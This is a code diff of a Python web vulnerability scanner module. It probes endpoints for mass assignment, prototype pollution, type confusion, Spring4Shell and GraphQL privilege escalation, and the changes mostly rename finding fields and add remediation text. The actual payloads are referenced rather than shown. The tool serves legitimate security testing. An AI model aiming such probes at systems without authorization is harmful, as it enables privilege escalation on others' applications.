+                                    cvss_score=9.8 if priv_field in ("admin", "is_admin", "isAdmin") else 8.5,
+                                    remediation=(
+                                        "1. Implement allowlist for accepted registration fields\n"
+                                        "2. Never bind admin/role fields from user input\n"
+                                        "3. Set default values server-side for sensitive fields\n"
+                                        "4. Use DTOs that exclude sensitive properties\n"
+                                        "5. Validate that only expected fields are present"
+                                    ),
+                                )
+                                findings.append(finding)
+
+                                # Stop after first CRITICAL finding for this endpoint
+                                if finding.severity == "CRITICAL":
+                                    return findings
+
+                except Exception as e:
+                    logger.debug(f"Registration mass assignment test error: {e}")
+
+        return findings
     
     async def _test_privilege_escalation(
         self,
@@ -1035,15 +1248,15 @@ class MassAssignmentScanner(ScanModule):
                     findings.append(Finding(
                         name=f"Mass Assignment: {field_name} Accepted",
                         severity=payload_obj.severity,
-                        confidence="HIGH",
+                        confidence_score=85.0,
                         description=f"The endpoint accepted injected field '{field_name}'. {payload_obj.description}",
-                        matched_at=url,
+                        endpoint=url,
                         evidence=[
                             f"Field: {field_name}",
                             f"Payload: {json.dumps(payload)}",
                             f"Response code: {response.status_code}",
                         ],
-                        cwe="CWE-915",
+                        cwe_id="CWE-915",
                         cvss_score=9.8 if payload_obj.severity == "CRITICAL" else 7.5,
                         remediation=(
                             "1. Implement allowlist for accepted fields\n"
@@ -1090,15 +1303,15 @@ class MassAssignmentScanner(ScanModule):
                     if "polluted" in body or "__proto__" in body:
                         findings.append(Finding(
                             name="Prototype Pollution Vulnerability",
-                            severity="CRITICAL",
-                            confidence="HIGH",
+                            severity=Severity.CRITICAL,
+                            confidence_score=85.0,
                             description=f"__proto__ payload accepted. {payload_obj.description}",
-                            matched_at=url,
+                            endpoint=url,
                             evidence=[
                                 f"Payload: {json.dumps(payload)}",
                                 "Response indicates pollution",
                             ],
-                            cwe="CWE-1321",
+                            cwe_id="CWE-1321",
                             cvss_score=9.8,
                             remediation=(
                                 "1. Sanitize JSON input to remove __proto__ and constructor\n"
@@ -1114,15 +1327,15 @@ class MassAssignmentScanner(ScanModule):
                     if "__proto__" in body or "prototype" in body:
                         findings.append(Finding(
                             name="Prototype Pollution Detected (Error)",
-                            severity="HIGH",
-                            confidence="MEDIUM",
+                            severity=Severity.HIGH,
+                            confidence_score=65.0,
                             description="__proto__ payload caused server error, indicating possible vulnerability",
-                            matched_at=url,
+                            endpoint=url,
                             evidence=[
                                 f"Payload: {json.dumps(payload)}",
                                 f"Error response: {response.text[:200]}",
                             ],
-                            cwe="CWE-1321",
+                            cwe_id="CWE-1321",
                             cvss_score=8.1,
                             remediation="Sanitize JSON input to filter __proto__ and constructor properties",
                         ))
@@ -1169,14 +1382,14 @@ class MassAssignmentScanner(ScanModule):
                             findings.append(Finding(
                                 name=f"Nested Object Injection: {field_name}",
                                 severity=payload_obj.severity,
-                                confidence="HIGH",
+                                confidence_score=85.0,
                                 description=f"Nested object injection successful via '{field_name}'. {payload_obj.description}",
-                                matched_at=url,
+                                endpoint=url,
                                 evidence=[
                                     f"Payload: {json.dumps(payload)}",
                                     f"Response: {response.text[:200]}",
                                 ],
-                                cwe="CWE-915",
+                                cwe_id="CWE-915",
                                 cvss_score=8.1,
                                 remediation="Flatten input validation, don't auto-merge nested objects",
                             ))
@@ -1224,14 +1437,14 @@ class MassAssignmentScanner(ScanModule):
                             findings.append(Finding(
                                 name=f"Type Confusion: {payload_obj.description}",
                                 severity=payload_obj.severity,
-                                confidence="MEDIUM",
+                                confidence_score=65.0,
                                 description=f"Type confusion attack successful. {payload_obj.description}",
-                                matched_at=url,
+                                endpoint=url,
                                 evidence=[
                                     f"Payload: {json.dumps(payload)}",
                                     f"Response: {response.text[:200]}",
                                 ],
-                                cwe="CWE-915",
+                                cwe_id="CWE-915",
                                 cvss_score=7.5,
                                 remediation="Implement strict type checking on all input parameters",
                             ))
@@ -1274,14 +1487,14 @@ class MassAssignmentScanner(ScanModule):
                             findings.append(Finding(
                                 name="Array Pollution Accepted",
                                 severity=payload_obj.severity,
-                                confidence="HIGH",
+                                confidence_score=85.0,
                                 description=f"Array pollution with admin values accepted. {payload_obj.description}",
-                                matched_at=url,
+                                endpoint=url,
                                 evidence=[
                                     f"Payload: {json.dumps(payload)}",
                                     f"Response: {response.text[:200]}",
                                 ],
-                                cwe="CWE-915",
+                                cwe_id="CWE-915",
                                 cvss_score=8.1,
                                 remediation="Validate array contents against allowlist of valid values",
                             ))
@@ -1330,15 +1543,15 @@ class MassAssignmentScanner(ScanModule):
                     if response.status_code != 400:
                         findings.append(Finding(
                             name="Potential Spring4Shell Vulnerability (CVE-2022-22965)",
-                            severity="CRITICAL",
-                            confidence="MEDIUM",
+                            severity=Severity.CRITICAL,
+                            confidence_score=65.0,
                             description="Spring Framework may be vulnerable to Spring4Shell RCE",
-                            matched_at=url,
+                            endpoint=url,
                             evidence=[
                                 f"Payload: {json.dumps(payload)}",
                                 f"Response: {response.status_code}",
                             ],
-                            cwe="CWE-94",
+                            cwe_id="CWE-94",
                             cvss_score=9.8,
                             remediation="Upgrade Spring Framework to patched version immediately",
                         ))
@@ -1353,14 +1566,14 @@ class MassAssignmentScanner(ScanModule):
                             findings.append(Finding(
                                 name=f"Framework-Specific Mass Assignment ({self.detected_framework.value})",
                                 severity=payload_obj.severity,
-                                confidence="HIGH",
+                                confidence_score=85.0,
                                 description=f"Framework-specific mass assignment successful. {payload_obj.description}",
-                                matched_at=url,
+                                endpoint=url,
                                 evidence=[
                                     f"Framework: {self.detected_framework.value}",
                                     f"Payload: {json.dumps(payload)}",
                                 ],
-                                cwe="CWE-915",
+                                cwe_id="CWE-915",
                                 cvss_score=8.5,
                                 remediation=f"Use {self.detected_framework.value} protection mechanisms (strong params, etc.)",
                             ))
@@ -1411,15 +1624,15 @@ class MassAssignmentScanner(ScanModule):
                     ]):
                         findings.append(Finding(
                             name="Hidden Parameter Accepted (Debug/Internal)",
-                            severity="MEDIUM",
-                            confidence="MEDIUM",
+                            severity=Severity.MEDIUM,
+                            confidence_score=65.0,
                             description="Application accepted debug/internal hidden parameters",
-                            matched_at=url,
+                            endpoint=url,
                             evidence=[
                                 f"Payload: {json.dumps(payload)}",
                                 "Debug information may be exposed",
                             ],
-                            cwe="CWE-200",
+                            cwe_id="CWE-200",
                             cvss_score=5.3,
                             remediation="Remove debug parameters from production or require authentication",
                         ))
@@ -1464,14 +1677,14 @@ class MassAssignmentScanner(ScanModule):
                                     findings.append(Finding(
                                         name="GraphQL Mass Assignment Mutation",
                                         severity=payload_obj.severity,
-                                        confidence="HIGH",
+                                        confidence_score=85.0,
                                         description=f"GraphQL mutation accepted privilege escalation. {payload_obj.description}",
-                                        matched_at=url,
+                                        endpoint=url,
                                         evidence=[
                                             f"Query: {payload_obj.data.get('query', '')}",
                                             f"Response: {json.dumps(resp_json)[:200]}",
                                         ],
-                                        cwe="CWE-915",
+                                        cwe_id="CWE-915",
                                         cvss_score=9.1,
                                         remediation="Implement input validation in GraphQL resolvers",
                                     ))
@@ -1547,7 +1760,7 @@ class MassAssignmentScanner(ScanModule):
         unique = []
         
         for finding in findings:
-            key = (finding.name, finding.matched_at)
+            key = (finding.name, finding.endpoint)
             if key not in seen:
                 seen.add(key)
                 unique.append(finding)
